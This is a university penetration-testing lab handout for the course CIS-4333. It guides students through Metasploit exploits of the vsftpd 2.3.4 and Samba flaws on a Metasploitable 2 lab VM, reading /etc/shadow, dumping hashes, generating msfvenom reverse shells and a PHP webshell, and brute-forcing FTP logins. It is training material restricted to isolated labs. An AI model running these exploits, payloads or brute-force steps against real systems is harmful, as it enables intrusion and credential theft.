# Lab Activity: Module 07 — Exploitation Techniques

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

## Authorization and Legal Notice

> **REQUIRED BEFORE STARTING:** All exploitation activities in this lab are conducted EXCLUSIVELY against Metasploitable 2 running in your isolated local VM network, or against HackTheBox/TryHackMe machines within their dedicated VPN environments. You have NO authorization to use any exploit, payload, or Metasploit module against any system outside these environments. Exploitation of unauthorized systems is a felony under 18 U.S.C. § 1030 (Computer Fraud and Abuse Act) and a violation of the Texas Penal Code § 33.02. There are no exceptions for "testing," "learning," or "curiosity." If you are unsure whether a target is authorized, STOP and contact Professor Nash.

---

## Lab Overview

In this lab you will use Metasploit to exploit known vulnerabilities in Metasploitable 2, establish Meterpreter sessions, and document the exploitation process as a professional penetration tester would. You will also practice payload generation with msfvenom.

**Estimated Time:** 2–3 hours

**Authorized Lab Targets:**

- Metasploitable 2 VM — your local isolated host-only network
- TryHackMe room: "Metasploit: Introduction" — [https://tryhackme.com/room/metasploitintro](https://tryhackme.com/room/metasploitintro)

**Required Setup:**

- Kali Linux VM with Metasploit installed (`sudo msfdb init && msfconsole`)
- Metasploitable 2 VM running and reachable from Kali
- Both VMs on isolated host-only network
- Lab notes document open and ready

---

## Part 1 — Metasploit Setup and Navigation (20 minutes)

### Step 1.1 — Initialize and Launch

```bash
sudo msfdb init
msfconsole
```

At the msfconsole prompt:

```text
msf6 > db_status
msf6 > workspace -a module07_lab
msf6 > workspace
```

Confirm the database is connected and you are working in the `module07_lab` workspace.

### Step 1.2 — Import Nmap Results

If you saved scan results from the Module 06 lab, import them:

```text
msf6 > db_nmap -sV -O METASPLOITABLE_IP
msf6 > hosts
msf6 > services
```

Record in your lab notes: how many services are listed in the Metasploit database for your target.

### Step 1.3 — Module Navigation Practice

```text
msf6 > search vsftpd
msf6 > search type:exploit platform:unix
msf6 > search cve:2011-2523
```

Record: how many results does `search vsftpd` return? What is the full path of the vsftpd 2.3.4 exploit module?

---

## Part 2 — Exploit vsftpd 2.3.4 Backdoor (30 minutes)

### Step 2.1 — Select and Configure the Module

```text
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > info
msf6 exploit(vsftpd_234_backdoor) > show options
```

Read the module info. In your lab notes, document:

- What vulnerability does this exploit target?
- What is the CVE identifier?
- What payload is set by default?

Configure the exploit:

```text
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS METASPLOITABLE_IP
msf6 exploit(vsftpd_234_backdoor) > show options
```

### Step 2.2 — Check and Exploit

```text
msf6 exploit(vsftpd_234_backdoor) > check
msf6 exploit(vsftpd_234_backdoor) > run
```

If successful, you will receive a command shell session. Run these commands and record the output:

```bash
whoami
id
hostname
uname -a
cat /etc/passwd | head -5
```

Take a screenshot showing the successful session and the command output.

### Step 2.3 — Document the Finding

In your lab notes, complete the exploitation documentation template:

- Date/Time
- Target IP and port
- Service and version
- CVE identifier
- Module used
- Payload
- Result (success/failure)
- Access level obtained
- Evidence (commands run and output)

Exit the session: type `exit` to return to the msfconsole prompt.

---

## Part 3 — Exploit Samba with Meterpreter Payload (40 minutes)

### Step 3.1 — Find the Samba Exploit

Metasploitable 2 runs a vulnerable version of Samba. Search for it:

```text
msf6 > search samba usermap
```

Select the `exploit/multi/samba/usermap_script` module.

### Step 3.2 — Configure with a Meterpreter Payload

```text
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > show payloads
msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse
msf6 exploit(usermap_script) > set RHOSTS METASPLOITABLE_IP
msf6 exploit(usermap_script) > set LHOST YOUR_KALI_IP
msf6 exploit(usermap_script) > set LPORT 4444
msf6 exploit(usermap_script) > show options
```

### Step 3.3 — Execute and Enumerate

```text
msf6 exploit(usermap_script) > run
```

From the session, run enumeration commands:

```bash
whoami
cat /etc/shadow | head -10
ls /root
netstat -an
```

Background the session:

```text
CTRL+Z (or type background)
msf6 > sessions -l
```

### Step 3.4 — Session Upgrade (Optional Extension)

If time permits, upgrade the shell session to Meterpreter:

```text
msf6 > sessions -u 1
msf6 > sessions -i 2
meterpreter > sysinfo
meterpreter > getuid
meterpreter > run post/linux/gather/hashdump
```

Take a screenshot of the Meterpreter session showing `sysinfo` and `getuid` output.

---

## Part 4 — msfvenom Payload Generation (30 minutes)

### Step 4.1 — Generate a Linux Reverse Shell

Outside msfconsole, in a Kali terminal:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_KALI_IP LPORT=5555 -f elf -o linux_payload.elf
file linux_payload.elf
ls -la linux_payload.elf
```

Record the file size. This is a stageless payload. Note the underscore in `shell_reverse_tcp`.

### Step 4.2 — Generate a Staged vs. Stageless Payload

```bash
# Staged (note: / between meterpreter and reverse_tcp)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_KALI_IP LPORT=5556 -f elf -o staged.elf

# Stageless (note: _ between meterpreter and reverse_tcp)
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YOUR_KALI_IP LPORT=5557 -f elf -o stageless.elf

ls -la staged.elf stageless.elf
```

Record and compare the file sizes of the staged and stageless payloads. Which is larger and why?

### Step 4.3 — PHP Webshell Generation

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR_KALI_IP LPORT=5558 -f raw -o webshell.php
cat webshell.php
```

Record: what does the first line of the PHP file look like? What does the `eval()` function do in this context?

**Note:** Do not deploy this webshell anywhere. This step demonstrates payload generation only.

---

## Part 5 — Auxiliary Module Practice (20 minutes)

### Step 5.1 — SMB Version Scanner

```text
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(smb_version) > set RHOSTS METASPLOITABLE_IP
msf6 auxiliary(smb_version) > run
```

Record: what SMB version and OS are reported?

### Step 5.2 — FTP Brute Force (Against Metasploitable Only)

```text
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(ftp_login) > set RHOSTS METASPLOITABLE_IP
msf6 auxiliary(ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
msf6 auxiliary(ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(ftp_login) > set THREADS 4
msf6 auxiliary(ftp_login) > run
```

Allow to run for 2–3 minutes then stop with `CTRL+C`. Record any credential pairs found.

---

## Deliverables

Submit to the Canvas assignment portal:

1. **vsftpd exploitation screenshot** — showing successful session and `whoami`/`id` output
2. **Samba exploitation screenshot** — showing session and `/etc/shadow` output
3. **msfvenom comparison** — screenshot showing both staged and stageless file sizes with explanation of the size difference
4. **Exploitation documentation** — completed documentation template for both exploits (Part 2.3 format)
5. **Reflection** (200–300 words): Describe the experience of exploiting vsftpd 2.3.4. Given that this is a vulnerability from 2011 that is still present in many unpatched systems, what does this tell you about the real-world challenge of vulnerability remediation? What would you include in your report to the client?

---

## Grading Rubric

| Component | Points | Criteria |
|-----------|--------|---------|
| vsftpd exploitation | 20 | Screenshot showing session, correct commands run |
| Samba exploitation | 20 | Screenshot showing session, commands documented |
| msfvenom comparison | 20 | Both payloads generated, size difference explained correctly |
| Exploitation documentation | 25 | Both exploits documented per professional template |
| Reflection | 15 | 200–300 words, specific and professional |
| **Total** | **100** | |

---

## Troubleshooting

**vsftpd exploit fails:**
Confirm the target is Metasploitable 2 (not a different VM). Check that FTP port 21 is open: `nmap -p 21 METASPLOITABLE_IP`. Some virtualization environments block the backdoor trigger — try `set ConnectTimeout 30`.

**Meterpreter session drops immediately:**
Check your LHOST is your Kali VM's IP on the host-only network (not 127.0.0.1). Run `ip addr` to confirm.

**msfvenom not found:**
Run `which msfvenom`. On Kali, it is at `/usr/bin/msfvenom`. If missing, run `sudo apt install metasploit-framework`.

**Auxiliary FTP scanner returns no results:**
Metasploitable's FTP may not have credentials matching the wordlist. This is expected — the exercise demonstrates the tool and workflow even without successful credentials.

---

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
